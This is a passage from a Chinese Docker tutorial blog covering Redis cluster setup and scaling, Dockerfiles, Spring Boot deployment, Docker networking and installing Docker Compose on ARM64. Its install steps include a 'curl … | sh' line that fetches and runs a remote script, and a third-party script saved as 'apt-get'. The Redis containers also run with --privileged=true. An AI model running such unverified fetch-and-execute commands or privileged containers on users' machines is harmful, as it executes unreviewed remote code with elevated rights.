</p><p>master_user：在主数据库创建的用于同步数据的用户账号； </p><p>master_password：在主数据库创建的用于同步数据的用户密码； </p><p>master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数； </p><p>master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数； </p><p>master_connect_retry：连接失败重试的时间间隔，单位为秒。 </p></li><li><p>在从数据库中开启主从同步</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">start</span> <span class="hljs-literal">slave</span>;<br></code></pre></td></tr></table></figure></li><li><p>查看从数据库状态，发现已同步</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">show</span> <span class="hljs-string">slave</span> <span class="hljs-string">status;</span><br><span class="hljs-attr">Slave_IO_Running:</span> <span class="hljs-literal">Yes</span><br><span class="hljs-attr">Slave_SQL_Running:</span> <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="6-分布式存储"><a href="#6-分布式存储" class="headerlink" title="6. 分布式存储"></a>6. 分布式存储</h2><h3 id="6-1-哈希取余分区"><a href="#6-1-哈希取余分区" class="headerlink" title="6.1 哈希取余分区"></a>6.1 哈希取余分区</h3><p>2亿条记录就是2亿个k,v，我们单机不行必须要分布式多机，假设有3台机器构成一个集群，用户每次读写操作都是根据公式：</p><p>hash(key) % N个机器台数，计算出哈希值，用来决定数据映射到哪一个节点上。 </p><p>优点：简单粗暴，直接有效，只需要预估好数据规划好节点，例如3台、8台、10台，就能保证一段时间的数据支撑。使用Hash算法让固定的一部分请求落到同一台服务器上，这样每台服务器固定处理一部分请求（并维护这些请求的信息），起到负载均衡+分而治之的作用。</p><p>缺点：原来规划好的节点，进行扩容或者缩容就比较麻烦了额，不管扩缩，每次数据变动导致节点有变动，映射关系需要重新进行计算，在服务器个数固定不变时没有问题，如果需要弹性扩容或故障停机的情况下，原来的取模公式就会发生变化：Hash(key)&#x2F;3会变成Hash(key) &#x2F;?。此时地址经过取余运算的结果将发生很大变化，根据公式获取的服务器也会变得不可控。 某个redis机器宕机了，由于台数数量变化，会导致hash取余全部数据重新洗牌。</p><h3 id="6-2-一致性哈希算法分区"><a href="#6-2-一致性哈希算法分区" class="headerlink" title="6.2 一致性哈希算法分区"></a>6.2 一致性哈希算法分区</h3><ol><li><p>构建一致性哈希环</p><p>一致性哈希算法必然有个hash函数并按照算法产生hash值，这个算法的所有可能哈希值会构成一个全量集，这个集合可以成为一个hash空间[0,2^32-1]，这个是一个线性空间，但是在算法中，我们通过适当的逻辑控制将它首尾相连(0 &#x3D; 2^32),这样让它逻辑上形成了一个环形空间。 </p></li><li><p>将集群中各个IP节点映射到环上的某一个位置。 </p><p>将各个服务器使用Hash进行一个哈希，具体可以选择服务器的IP或主机名作为关键字进行哈希，这样每台机器就能确定其在哈希环上的位置。</p></li><li><p>当我们需要存储一个kv键值对时，首先计算key的hash值，hash(key)，将这个key使用相同的函数Hash计算出哈希值并确定此数据在环上的位置， 从此位置沿环顺时针行走，第一台遇到的服务器就是其应该定位到的服务器，并将该键值对存储在该节点上。</p></li></ol><p>优点：</p><ul><li><p>容错性：假设Node C宕机，可以看到此时对象A、B、D不会受到影响，只有C对象被重定位到Node D。一般的，在一致性Hash算法中，如果一台服务器不可用，则 受影响的数据仅仅是此服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据 ，其它不会受到影响。简单说，就是C挂了，受到影响的只是B、C之间的数据，并且这些数据会转移到D进行存储。</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221207143658100.png" alt="image-20221207143658100" style="zoom:50%;" /></li><li><p>扩展性：数据量增加了，需要增加一台节点NodeX，X的位置在A和B之间，那收到影响的也就是A到X之间的数据，重新把A到X的数据录入到X上即可， 不会导致hash取余全部数据重新洗牌。</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221207143624648.png" alt="image-20221207143624648" style="zoom: 50%;" /></li></ul><p>缺点：Hash环的数据倾斜问题 </p><p>一致性Hash算法在服务 <strong>节点太少时</strong> ，容易因为节点分布不均匀而造成 <strong>数据倾斜</strong> （被缓存的对象大部分集中缓存在某一台服务器上）</p><h2 id="7-Docker-Redis集群搭建"><a href="#7-Docker-Redis集群搭建" class="headerlink" title="7. Docker Redis集群搭建"></a>7. Docker Redis集群搭建</h2><h3 id="7-1-主从搭建"><a href="#7-1-主从搭建" class="headerlink" title="7.1 主从搭建"></a>7.1 主从搭建</h3><ol><li><p>搭建Redis集群</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker run -d <span class="hljs-params">--name</span> redis-node-1 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-1</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6381 <br>  <br>docker run -d <span class="hljs-params">--name</span> redis-node-2 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-2</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6382 <br>  <br>docker run -d <span class="hljs-params">--name</span> redis-node-3 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-3</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6383 <br>  <br>docker run -d <span class="hljs-params">--name</span> redis-node-4 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-4</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6384 <br>  <br>docker run -d <span class="hljs-params">--name</span> redis-node-5 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-5</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6385 <br>  <br>docker run -d <span class="hljs-params">--name</span> redis-node-6 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-6</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6386 <br></code></pre></td></tr></table></figure></li><li><p>进入容器，为集群构建主从关系</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">docker exec -it redis-node-<span class="hljs-number">1</span> /bin/bash<br><br>redis-cli --cluster create <span class="hljs-number">10.249.238.5</span>:<span class="hljs-number">6381 10.249</span>.<span class="hljs-number">238.5:6382</span> <span class="hljs-number">10.249.238.5</span>:<span class="hljs-number">6383 10.249</span>.<span class="hljs-number">238.5:6384</span> <span class="hljs-number">10.249.238.5</span>:<span class="hljs-number">6385 10.249</span>.<span class="hljs-number">238.5:6386</span>  --cluster-replicas <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure></li></ol><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221207153624644.png" alt="image-20221207153624644" style="zoom:50%;" /><ol start="3"><li>通过 <code>redis-cli -p 6381 -c</code> 命令进入集群，以防止路由失效</li><li>通过命令 <code>redis-cli --cluster check 10.249.238.5:6381</code> 查看集群状态</li><li>主从切换：主机宕机，从机上位</li></ol><h3 id="7-2-主从扩容"><a href="#7-2-主从扩容" class="headerlink" title="7.2 主从扩容"></a>7.2 主从扩容</h3><ol><li><p>新建两个Redis节点</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker run -d <span class="hljs-params">--name</span> redis-node-7 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-7</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6387 <br><br>docker run -d <span class="hljs-params">--name</span> redis-node-8 <span class="hljs-params">--net</span> host <span class="hljs-params">--privileged=true</span> -v <span class="hljs-string">/data/redis/share/redis-node-8</span>:<span class="hljs-string">/data</span> redis<span class="hljs-function">:6.0.16</span> <span class="hljs-params">--cluster-enabled</span> yes <span class="hljs-params">--appendonly</span> yes <span class="hljs-params">--port</span> 6388 <br></code></pre></td></tr></table></figure></li><li><p>进入6387容器内部</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker exec -it redis-<span class="hljs-keyword">node</span><span class="hljs-title">-7</span> /bin/bash<br></code></pre></td></tr></table></figure><p>将新增的6387节点作为master节点加入集群</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># 6387 就是将要作为master新增节点 </span><br><span class="hljs-comment"># 6381 就是原来集群节点里面的领路人</span><br>redis-cli --cluster<span class="hljs-built_in"> add-node </span>10.249.238.5:6387 10.249.238.5:6381<br></code></pre></td></tr></table></figure></li><li><p>检查集群情况</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">redis-cli --cluster<span class="hljs-built_in"> check </span>10.249.238.5:6381<br></code></pre></td></tr></table></figure><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221207171056093.png" alt="image-20221207171056093" style="zoom: 50%;" /></li><li><p>重新分派槽号</p><p>4台机器：平分之后为4096</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">redis-<span class="hljs-keyword">cli</span> --<span class="hljs-keyword">cluster</span> reshard 10.249.238.5:6381<br></code></pre></td></tr></table></figure><p>为什么6387是3个新的区间，以前的还是连续？</p><p>重新分配成本太高，所以前3家各自匀出来一部分，从6381&#x2F;6382&#x2F;6383三个旧节点分别匀出1364个坑位给新节点6387</p></li></ol><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221207171611411.png" alt="image-20221207171611411" style="zoom:50%;" /><ol start="5"><li><p>为主节点6387分配从节点6388</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">redis-cli --cluster<span class="hljs-built_in"> add-node </span>10.249.238.5:6388 10.249.238.5:6387 --cluster-slave --cluster-master-id b8fbe4eba45cb5f8c44eca3fe15e0a96d927d27c<br></code></pre></td></tr></table></figure></li></ol><h3 id="7-3-主从缩容"><a href="#7-3-主从缩容" class="headerlink" title="7.3 主从缩容"></a>7.3 主从缩容</h3><p>将添加的两个节点6387和6388下线（先删从节点，再删主节点）</p><ol><li><p>将6388删除</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">redis-cli --cluster del-<span class="hljs-keyword">node</span> <span class="hljs-title">10</span>.<span class="hljs-number">249.238</span>.<span class="hljs-number">5</span>:<span class="hljs-number">6388</span> <span class="hljs-number">67673</span>fee431f0146671773da6326076bb8b30343<br></code></pre></td></tr></table></figure></li><li><p>将6387的槽号清空，重新分配。这里全部分配给6382</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">redis-<span class="hljs-keyword">cli</span> --<span class="hljs-keyword">cluster</span> reshard 10.249.238.5:6381 <br></code></pre></td></tr></table></figure></li><li><p>将6387删除</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">redis-cli --cluster del-<span class="hljs-keyword">node</span> <span class="hljs-title">10</span>.<span class="hljs-number">249.238</span>.<span class="hljs-number">5</span>:<span class="hljs-number">6387</span> b8fbe4eba45cb5f8c44eca3fe15e0a96d927d27c<br></code></pre></td></tr></table></figure></li></ol><h2 id="8-DockerFile"><a href="#8-DockerFile" class="headerlink" title="8. DockerFile"></a>8. DockerFile</h2><p>Dockerfile是用来构建Docker镜像的文本文件，是由一条条构建镜像所需的指令和参数构成的脚本。</p><h3 id="8-1-DockerFile基础"><a href="#8-1-DockerFile基础" class="headerlink" title="8.1 DockerFile基础"></a>8.1 DockerFile基础</h3><ol><li>每条保留字指令都必须为大写字母且后面要跟随至少一个参数</li><li>指令按照从上到下，顺序执行</li><li>表示注释</li><li>每条指令都会创建一个新的镜像层并对镜像进行提交</li></ol><p>执行DockerFile基本流程</p><ol><li>docker从基础镜像运行一个容器</li><li>执行一条指令并对容器作出修改</li><li>执行类似docker commit的操作提交一个新的镜像层</li><li>docker再基于刚提交的镜像运行一个新容器</li><li>执行dockerfile中的下一条指令直到所有指令都执行完成</li></ol><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221207174219551.png" alt="image-20221207174219551" style="zoom:50%;" /><h3 id="8-2-DockerFile常见保留字"><a href="#8-2-DockerFile常见保留字" class="headerlink" title="8.2 DockerFile常见保留字"></a>8.2 DockerFile常见保留字</h3><h3 id="8-3-DockerFile自定义镜像"><a href="#8-3-DockerFile自定义镜像" class="headerlink" title="8.3 DockerFile自定义镜像"></a>8.3 DockerFile自定义镜像</h3><p>需要指定centos版本，并且 <code>RUN yum -y install glibc</code>不加版本号</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM centos:<span class="hljs-number">7</span><br>MAINTAINER ltyzzz&lt;ltyzzz2000@gmail.com&gt;<br> <br>ENV MYPATH <span class="hljs-regexp">/usr/</span>local<br>WORKDIR <span class="hljs-variable">$MYPATH</span><br><br><span class="hljs-comment">#安装vim编辑器</span><br>RUN yum -y install vim<br><span class="hljs-comment">#安装ifconfig命令查看网络IP</span><br>RUN yum -y install net-tools<br><span class="hljs-comment">#安装java8及lib库</span><br>RUN yum -y install glibc<br>RUN mkdir <span class="hljs-regexp">/usr/</span>local/java<br><span class="hljs-comment">#ADD 是相对路径jar,把jdk-8u171-linux-x64.tar.gz添加到容器中,安装包必须要和Dockerfile文件在同一位置</span><br>ADD jdk-<span class="hljs-number">8</span>u331-linux-aarch64.tar.gz <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span><br><span class="hljs-comment">#配置java环境变量</span><br>ENV JAVA_HOME <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk1.<span class="hljs-number">8.0</span>_331<br>ENV JRE_HOME <span class="hljs-variable">$JAVA_HOME</span>/jre<br>ENV CLASSPATH <span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/lib/</span>dt.jar:<span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/lib/</span>tools.jar:<span class="hljs-variable">$JRE_HOME</span>/lib:<span class="hljs-variable">$CLASSPATH</span><br>ENV PATH <span class="hljs-variable">$JAVA_HOME</span>/bin:<span class="hljs-variable">$PATH</span><br><br>EXPOSE <span class="hljs-number">80</span><br><br>CMD echo <span class="hljs-variable">$MYPATH</span><br>CMD echo <span class="hljs-string">&quot;success--------------ok&quot;</span><br>CMD <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h3 id="8-4-DockerFile虚悬镜像"><a href="#8-4-DockerFile虚悬镜像" class="headerlink" title="8.4 DockerFile虚悬镜像"></a>8.4 DockerFile虚悬镜像</h3><p>仓库名、标签都是<none>的镜像，即dangling image</p><p>编写虚悬镜像步骤</p><ol><li><p>编写Dockerfile文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">vim Dockerfile<br><br><span class="hljs-keyword">from</span> ubuntu<br><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;action is success&#x27;</span> </span><br></code></pre></td></tr></table></figure></li><li><p>构建镜像</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">docker build .<br></code></pre></td></tr></table></figure></li><li><p>查看虚悬镜像</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">docker image ls -f dangling=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="9-Docker部署模块"><a href="#9-Docker部署模块" class="headerlink" title="9. Docker部署模块"></a>9. Docker部署模块</h2><h3 id="9-1-部署过程"><a href="#9-1-部署过程" class="headerlink" title="9.1 部署过程"></a>9.1 部署过程</h3><p>通过打包Springboot项目得到jar包，并通过Dockerfile生成镜像，以容器形式运行在虚拟机上</p><ol><li><p>打包Springboot项目：package</p></li><li><p>在虚拟机中的&#x2F;mydocker目录下编写Dockerfile文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 基础镜像java</span><br><span class="hljs-keyword">FROM</span> openjdk:<span class="hljs-number">8</span> <br><span class="hljs-comment"># 作者 </span><br><span class="hljs-keyword">MAINTAINER</span> lty <br><span class="hljs-comment"># VOLUME 指定临时文件目录为/tmp，在主机/var/lib/docker目录下创建了一个临时文件并链接到容器的/tmp </span><br><span class="hljs-keyword">VOLUME</span><span class="language-bash"> /tmp </span><br><span class="hljs-comment"># 将jar包添加到容器中并更名为zzyy_docker.jar </span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> docker-demo-0.0.1-SNAPSHOT.jar lty_docker.jar</span><br><span class="hljs-comment"># 运行jar包 </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> bash -c <span class="hljs-string">&#x27;touch /lty_docker.jar&#x27;</span> </span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;-jar&quot;</span>,<span class="hljs-string">&quot;/lty_docker.jar&quot;</span>] </span><br><span class="hljs-comment">#暴露6001端口作为微服务 </span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">6001</span><br></code></pre></td></tr></table></figure></li><li><p>将生成的jar包拖动到虚拟机mydocker目录下</p></li><li><p>通过如下命令生成镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t lty_docker:<span class="hljs-number">1</span>.<span class="hljs-number">0</span> .<br></code></pre></td></tr></table></figure></li><li><p>以容器方式后台运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">6001</span>:<span class="hljs-number">6001</span> <span class="hljs-number">376</span>a8091251b<br></code></pre></td></tr></table></figure></li></ol><h3 id="9-2-容器通信bug"><a href="#9-2-容器通信bug" class="headerlink" title="9.2 容器通信bug"></a>9.2 容器通信bug</h3><p>主机中的容器失去与外界容器的连接:</p><ol><li>主机可以与其他主机通信。</li><li>在主机中运行的容器无法与其他主机通信。</li></ol><p>后台运行通过Dockerfile打包的Springboot镜像后提示：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-symbol">WARNING: </span>IPv4 forwarding is disabled. Networking will not work.<br></code></pre></td></tr></table></figure><p>解决方案：</p><ol><li><p>将以下内容添加到 &#x2F;etc&#x2F;sysctl.conf 中</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">net.ipv4.ip_forward</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>重启网络服务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service network restart</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="10-Docker网络"><a href="#10-Docker网络" class="headerlink" title="10. Docker网络"></a>10. Docker网络</h2><p>docker启动后，会建立一个名为docker0的虚拟网桥，可用ifconfig命令查看</p><ul><li>容器间的互联和通信以及端口映射</li><li>容器IP变动时候可以通过服务名直接网络通信而不受到影响</li></ul><h3 id="10-1-网络命令"><a href="#10-1-网络命令" class="headerlink" title="10.1 网络命令"></a>10.1 网络命令</h3><ol><li><p>查看网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure></li><li><p>查看网络源数据</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">docker network <span class="hljs-keyword">inspect</span>  XXX网络名字<br></code></pre></td></tr></table></figure></li><li><p>删除网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network <span class="hljs-built_in">rm</span> XXX网络名字<br></code></pre></td></tr></table></figure></li></ol><h3 id="10-2-网络模式"><a href="#10-2-网络模式" class="headerlink" title="10.2 网络模式"></a>10.2 网络模式</h3><ol><li>bridge模式：使用–network bridge指定，默认使用docker0<ul><li>Docker 服务默认会创建一个 docker0 网桥（其上有一个 docker0 内部接口），该桥接网络的名称为docker0，它在 内核层 连通了其他的物理或虚拟网卡，这就将所有容器和本地主机都放到 同一个物理网络 。Docker 默认指定了 docker0 接口 的 IP 地址和子网掩码， 让主机和容器之间可以通过网桥相互通信。</li></ul></li><li>host模式：使用–network host指定<ul><li>直接使用宿主机的 IP 地址与外界进行通信，不再需要额外进行NAT 转换。</li></ul></li><li>none模式：使用–network none指定<ul><li>在none模式下，并不为Docker容器进行任何网络配置。 也就是说，这个Docker容器没有网卡、IP、路由等信息，只有一个lo。需要我们自己为Docker容器添加网卡、配置IP等。</li></ul></li><li>container模式：使用–network container:NAME或者容器ID指定<ul><li>新建的容器和已经存在的一个容器共享一个网络ip配置而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的IP，而是和一个指定的容器共享IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。</li></ul></li></ol><h2 id="11-Docker-Compose"><a href="#11-Docker-Compose" class="headerlink" title="11. Docker-Compose"></a>11. Docker-Compose</h2><p>Docker-Compose是Docker官方的开源项目，负责实现对Docker容器集群的快速编排。</p><h3 id="11-1-Linux-Arm64-安装Docker-Compose"><a href="#11-1-Linux-Arm64-安装Docker-Compose" class="headerlink" title="11.1 Linux Arm64 安装Docker-Compose"></a>11.1 Linux Arm64 安装Docker-Compose</h3><p>Docker-Compose目前没有arm64版本，目前只支持pip安装</p><ol><li><p>安装apt-get</p><ul><li>apt-get命令是ubuntu等操作系统的安装命令，和yum为同类</li></ul><p>下载apt-get</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/dvershinin/</span>apt-get-centos<span class="hljs-regexp">/master/</span>apt-get.sh -o <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>apt-get<br></code></pre></td></tr></table></figure><p>修改权限</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod <span class="hljs-number">0755</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>apt-get<br></code></pre></td></tr></table></figure></li><li><p>安装Docker Compose</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> -<span class="hljs-keyword">y</span><br>sudo apt-<span class="hljs-built_in">get</span> upgrade -<span class="hljs-keyword">y</span><br>sudo apt-<span class="hljs-built_in">get</span> install curl <span class="hljs-keyword">python3</span>-pip libffi-dev <span class="hljs-keyword">python</span>-openssl libssl-dev zlib1g-dev gcc g++ <span class="hljs-keyword">make</span> -<span class="hljs-keyword">y</span><br>curl -sSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br>sudo snap install rustup --classic<br>sudo apt install rustc<br>sudo pip3 install docker-compose<br>sudo docker-compose --<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><p>sudo pip3 install docker-compose命令报错时，执行如下命令，然后再重新安装</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo -H pip3 install <span class="hljs-comment">--upgrade pip</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="11-2-Compose核心概念"><a href="#11-2-Compose核心概念" class="headerlink" title="11.2 Compose核心概念"></a>11.2 Compose核心概念</h3><p>服务：一个个应用容器实例，比如订单微服务、库存微服务、mysql容器、nginx容器或者redis容器</p><p>工程：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。</p><h3 id="11-3-Compose使用步骤"><a href="#11-3-Compose使用步骤" class="headerlink" title="11.3 Compose使用步骤"></a>11.3 Compose使用步骤</h3><ol><li>编写Dockerfile定义各个微服务应用并构建出对应的镜像文件</li><li>使用 docker-compose.yml 定义一个完整业务单元，安排好整体应用中的各个容器服务。</li><li>执行 <code>docker-compose up</code> 命令 来启动并运行整个应用程序，完成一键部署上线</li></ol><h3 id="11-4-Compose常用命令"><a href="#11-4-Compose常用命令" class="headerlink" title="11.4 Compose常用命令"></a>11.4 Compose常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Compose 常用命令 <br>docker-compose -h                           <span class="hljs-comment">#  查看帮助 </span><br>docker-compose up                           <span class="hljs-comment">#  启动所有 docker-compose服务 </span><br>docker-compose up -d                        <span class="hljs-comment">#  启动所有 docker-compose服务 并后台运行 </span><br>docker-compose down                         <span class="hljs-comment">#  停止并删除容器、网络、卷、镜像。 </span><br>docker-compose <span class="hljs-built_in">exec</span>  yml里面的服务<span class="hljs-built_in">id</span>                 <span class="hljs-comment"># 进入容器实例内部  docker-compose exec  docker-compose.yml文件中写的服务id  /bin/bash </span><br>docker-compose ps                      <span class="hljs-comment"># 展示当前docker-compose编排过的运行的所有容器 </span><br>docker-compose top                     <span class="hljs-comment"># 展示当前docker-compose编排过的容器进程 </span><br>docker-compose logs  yml里面的服务<span class="hljs-built_in">id</span>     <span class="hljs-comment">#  查看容器输出日志 </span><br>docker-compose config     <span class="hljs-comment">#  检查配置 </span><br>docker-compose config -q  <span class="hljs-comment">#  检查配置，有问题才有输出 </span><br>docker-compose restart   <span 